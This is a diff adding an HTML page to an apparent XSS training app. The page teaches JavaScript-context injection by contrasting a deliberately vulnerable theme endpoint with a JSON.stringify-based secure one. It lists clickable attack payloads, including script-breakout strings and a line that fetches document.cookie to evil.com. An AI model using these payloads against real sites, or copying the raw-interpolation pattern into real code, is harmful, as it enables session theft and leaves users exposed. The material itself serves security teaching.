@@ -1,0 +1,167 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>JS Context XSS — Vulnerable</title>
+  <link rel="stylesheet" href="/styles.css">
+</head>
+<body>
+  <nav class="topnav">
+    <a href="/" class="nav-home">&#8962; Home</a>
+    <span class="badge" style="background:#fef2f2;color:#dc2626;border:1.5px solid #dc2626">VULNERABLE</span>
+    <a href="/secure/jscontext.html" class="switch-btn switch-to-secure">View Secure Version →</a>
+  </nav>
+
+  <main class="container">
+    <div class="page-header">
+      <h1>JS Context XSS</h1>
+      <p>User input lands inside a <code>&lt;script&gt;</code> block. This is a different injection context — <code>escapeHtml()</code> is the wrong fix here. The correct tool is <code>JSON.stringify()</code> with extra encoding.</p>
+    </div>
+
+    <div class="note vuln">
+      <span>&#9888;</span>
+      <div><strong>Root cause:</strong> User input is interpolated directly into a JavaScript string literal inside a <code>&lt;script&gt;</code> block. A <code>"</code> in the input closes the string — everything after it executes as code.</div>
+    </div>
+
+    <!-- Try It -->
+    <p class="section-title">Try It — Theme Configurator</p>
+    <div class="try-it-box">
+      <div class="try-label">&#9888; Vulnerable — raw JS string injection</div>
+      <p style="font-size:.85rem;color:#6b7280;margin-bottom:12px">Color is embedded as <code>var bgColor = "COLOR";</code> inside the response's <code>&lt;script&gt;</code> block.</p>
+      <div class="demo-form">
+        <input type="text" id="colorInput" value="lightblue" placeholder="Enter a color or payload..." autocomplete="off">
+        <button class="btn btn-vuln" onclick="sendTheme()">Apply Theme (Vulnerable)</button>
+      </div>
+      <p class="try-it-hint">Opens <code>/api/theme?color=YOUR_INPUT</code> — raw value embedded in a script block.</p>
+    </div>
+
+    <!-- Payload chips -->
+    <p class="section-title">Attack Payloads — Click to Load, Then Apply Theme</p>
+    <div class="payloads">
+      <h3>Click to load, then click Apply Theme</h3>
+      <button class="payload-tag" data-target="colorInput" data-payload='lightblue"; alert("JS Context XSS");//'>lightblue&quot;; alert(&quot;JS Context XSS&quot;);//</button>
+      <button class="payload-tag" data-target="colorInput" data-payload='"; alert(document.cookie);//'>&quot;; alert(document.cookie);//</button>
+      <button class="payload-tag" data-target="colorInput" data-payload="</script><script>alert('script tag closed')//">&lt;/script&gt;&lt;script&gt;alert('script tag closed')//</button>
+      <button class="payload-tag" data-target="colorInput" data-payload='"; fetch("http://evil.com?c="+document.cookie);//'>&quot;; fetch(&quot;http://evil.com?c=&quot;+document.cookie);//</button>
+    </div>
+
+    <!-- Why escapeHtml fails -->
+    <p class="section-title">Why escapeHtml() Is the Wrong Fix Here</p>
+    <div class="panel" style="margin-bottom:20px">
+      <div class="panel-header code">&#128308; Context mismatch — wrong tool for the job</div>
+      <div class="panel-body">
+        <div class="code-block"><span class="c-gray">// Suppose we "fix" it with escapeHtml():</span>
+<span class="c-purple">const</span> color = <span class="c-yellow">escapeHtml</span>(req.query.color);
+<span class="c-gray">// Input: lightblue"; alert(1);//</span>
+<span class="c-gray">// Output: lightblue&quot;; alert(1);//</span>
+
+<span class="c-gray">// Rendered script block:</span>
+<span class="c-green">var bgColor = "lightblue&amp;quot;; alert(1);//";</span>
+
+<span class="c-gray">// In a &lt;script&gt; block, HTML entities are NOT decoded.</span>
+<span class="c-gray">// JavaScript sees: &amp;quot; as literal characters, not ".</span>
+<span class="c-gray">// So the " injection is prevented... BUT:</span>
+
+<span class="c-gray">// ❌ Still fails for single-quote templates:</span>
+<span class="c-gray">// var x = '${color}'; + payload: '; alert(1);//</span>
+<span class="c-gray">// escapeHtml encodes ", not ' — single quote breaks out.</span>
+
+<span class="c-gray">// ❌ Still fails for non-string JS contexts:</span>
+<span class="c-gray">// var x = ${color};  (no quotes) — any JS expression works</span>
+
+<span class="c-gray">// ❌ Still fails for template literals:</span>
+<span class="c-gray">// var x = `${color}`; + payload: ${alert(1)}</span>
+<span class="c-gray">// escapeHtml doesn't encode $, {, } — template expression executes.</span>
+
+<span class="c-gray">// ✅ Use JSON.stringify() — it's designed for this context.</span></div>
+      </div>
+    </div>
+
+    <!-- Code comparison -->
+    <p class="section-title">Code — Vulnerable vs Secure</p>
+    <div class="demo-grid">
+      <div class="panel">
+        <div class="panel-header vuln">&#128308; VULNERABLE — /api/theme</div>
+        <div class="panel-body">
+          <div class="code-block"><span class="c-purple">const</span> color = req.query.color || <span class="c-green">''</span>;
+
+<span class="c-gray">// ❌ Raw interpolation in &lt;script&gt; block</span>
+res.<span class="c-yellow">send</span>(`
+  &lt;script&gt;
+    var bgColor = "<span class="c-red">${color}</span>";
+    <span class="c-gray">// payload: "; alert(1);//
+    // result:  var bgColor = ""; alert(1);//";</span>
+  &lt;/script&gt;
+`);</div>
+        </div>
+      </div>
+      <div class="panel">
+        <div class="panel-header secure">&#128994; SECURE — /api/theme/safe</div>
+        <div class="panel-body">
+          <div class="code-block"><span class="c-purple">const</span> color = req.query.color || <span class="c-green">''</span>;
+
+<span class="c-gray">// ✅ JSON.stringify + encode &lt; &gt; /</span>
+<span class="c-purple">const</span> safe = <span class="c-yellow">safeJsonForScript</span>(color);
+
+res.<span class="c-yellow">send</span>(`
+  &lt;script&gt;
+    var bgColor = <span class="c-green">${safe}</span>;
+    <span class="c-gray">// safe includes quotes + escaping</span>
+  &lt;/script&gt;
+`);</div>
+        </div>
+      </div>
+    </div>
+
+    <!-- How it works -->
+    <div class="how-it-works">
+      <h2>Two Attacks in One Scenario</h2>
+      <ul class="step-list">
+        <li>
+          <span class="step-num">A</span>
+          <div><strong>String breakout:</strong> Payload <code>"; alert(1);//</code> — the <code>"</code> closes the string literal. <code>alert(1)</code> runs as top-level JS. <code>//</code> comments out the trailing <code>";</code>.</div>
+        </li>
+        <li>
+          <span class="step-num">B</span>
+          <div><strong>Script tag close:</strong> Payload <code>&lt;/script&gt;&lt;script&gt;alert(1)//</code> — the HTML parser closes the <code>&lt;script&gt;</code> block early when it sees <code>&lt;/script&gt;</code>. A new script tag opens immediately after.</div>
+        </li>
+        <li>
+          <span class="step-num">C</span>
+          <div><code>safeJsonForScript()</code> handles both: JSON.stringify escapes <code>"</code> as <code>\"</code>, and extra encoding converts <code>&lt;</code> → <code><</code> so the HTML parser never sees a real <code>&lt;/script&gt;</code>.</div>
+        </li>
+      </ul>
+    </div>
+
+    <a href="/" class="btn btn-back">← Back to All Demos</a>
+  </main>
+
+  <div class="toast" id="toast"></div>
+
+  <script>
+    function sendTheme() {
+      const color = document.getElementById('colorInput').value;
+      window.open('/api/theme?color=' + encodeURIComponent(color), '_blank');
+    }
+
+    document.querySelectorAll('.payload-tag[data-target]').forEach(btn => {
+      btn.addEventListener('click', () => {
+        const input = document.getElementById(btn.dataset.target);
+        if (!input) return;
+        input.value = btn.dataset.payload;
+        input.focus();
+        btn.classList.add('filled');
+        setTimeout(() => btn.classList.remove('filled'), 1200);
+        showToast('✓ Payload loaded — click Apply Theme');
+      });
+    });
+
+    function showToast(msg) {
+      const t = document.getElementById('toast');
+      t.textContent = msg;
+      t.classList.add('show');
+      setTimeout(() => t.classList.remove('show'), 2000);
+    }
+  </script>
+</body>
+</html>
